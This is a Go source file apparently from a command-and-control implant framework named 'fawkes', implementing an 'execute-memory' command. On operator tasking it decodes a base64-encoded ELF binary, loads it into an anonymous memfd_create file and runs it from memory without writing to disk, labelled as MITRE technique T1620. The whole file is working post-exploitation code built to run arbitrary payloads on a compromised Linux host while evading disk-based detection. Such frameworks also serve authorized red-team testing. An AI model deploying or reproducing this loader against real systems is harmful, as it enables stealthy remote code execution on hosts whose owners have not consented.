//go:build linux

package commands

import (
	"bytes"
	"context"
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"time"

	"fawkes/pkg/structs"

	"golang.org/x/sys/unix"
)

// ExecuteMemoryCommand executes an ELF binary entirely from memory using memfd_create.
type ExecuteMemoryCommand struct{}

func (c *ExecuteMemoryCommand) Name() string { return "execute-memory" }
func (c *ExecuteMemoryCommand) Description() string {
	return "Execute an ELF binary from memory via memfd_create without writing to disk (T1620)"
}

type executeMemoryArgs struct {
	BinaryB64  string `json:"binary_b64"`  // base64-encoded ELF binary
	Arguments  string `json:"arguments"`   // command-line arguments (space-separated)
	Timeout    int    `json:"timeout"`     // execution timeout in seconds (default: 60)
	ExportName string `json:"export_name"` // (Windows only) export function to call for DLLs
}

func (c *ExecuteMemoryCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		return errorResult("Error: binary_b64 parameter required (base64-encoded ELF binary)")
	}

	args, parseErr := unmarshalParams[executeMemoryArgs](task)
	if parseErr != nil {
		return *parseErr
	}

	if args.BinaryB64 == "" {
		return errorResult("Error: binary_b64 is empty")
	}

	binaryData, err := base64.StdEncoding.DecodeString(args.BinaryB64)
	if err != nil {
		return errorf("Error decoding binary: %v", err)
	}

	if len(binaryData) < 4 {
		return errorResult("Error: binary data too small to be valid")
	}

	// Validate ELF magic bytes
	if binaryData[0] != 0x7f || binaryData[1] != 'E' || binaryData[2] != 'L' || binaryData[3] != 'F' {
		return errorResult("Error: not a valid ELF binary (missing magic header)")
	}

	timeout := args.Timeout
	if timeout <= 0 {
		timeout = 60
	}

	// Create anonymous memory file descriptor
	fd, err := unix.MemfdCreate("", 0)
	if err != nil {
		return errorf("Error: memfd_create failed: %v", err)
	}

	file := os.NewFile(uintptr(fd), "memfd")
	defer file.Close()

	// Write ELF binary to memfd
	if _, err := file.Write(binaryData); err != nil {
		return errorf("Error writing binary to memfd: %v", err)
	}

	// Build execution path using the parent process PID.
	// /proc/<pid>/fd/<fd> resolves to the memfd in both parent and child contexts
	// (unlike /proc/self/fd/<fd> which changes meaning after fork).
	execPath := fmt.Sprintf("/proc/%d/fd/%d", os.Getpid(), fd)

	// Parse command-line arguments
	var cmdArgs []string
	if args.Arguments != "" {
		cmdArgs = strings.Fields(args.Arguments)
	}

	// Execute with timeout
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeout)*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, execPath, cmdArgs...)

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	execErr := cmd.Run()

	// Build output from stdout + stderr
	var sb strings.Builder
	if stdout.Len() > 0 {
		sb.WriteString(stdout.String())
	}
	if stderr.Len() > 0 {
		if sb.Len() > 0 {
			sb.WriteString("\n")
		}
		sb.WriteString("[stderr] ")
		sb.WriteString(stderr.String())
	}

	if execErr != nil {
		if ctx.Err() == context.DeadlineExceeded {
			sb.WriteString(fmt.Sprintf("\n[Process timed out after %ds]", timeout))
		}
		output := sb.String()
		if output == "" {
			output = fmt.Sprintf("Error executing binary: %v", execErr)
		}
		return errorResult(output)
	}

	output := sb.String()
	if output == "" {
		output = fmt.Sprintf("[+] Binary executed successfully (%d bytes, no output)", len(binaryData))
	}

	return successResult(output)
}
